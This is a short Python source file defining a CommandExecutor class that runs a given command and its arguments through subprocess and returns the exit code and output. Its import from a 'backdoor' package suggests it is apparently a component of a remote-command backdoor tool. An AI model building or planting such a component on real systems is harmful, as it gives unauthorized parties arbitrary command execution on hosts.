import subprocess

from backdoor.models.commands import Command, CommandResult


class CommandExecutor:

    def execute(self, command: Command) -> CommandResult:
        cmd, args = command.command, command.args
        try:
            result = subprocess.run(
                [cmd, *(args or [])], capture_output=True, text=True
            )
            return CommandResult(
                success=result.returncode == 0,
                returncode=result.returncode,
                stdout=result.stdout,
                stderr=result.stderr,
            )
        except FileNotFoundError:
            return CommandResult(
                success=False, returncode=127, stderr=f"command not found: {cmd}"
            )
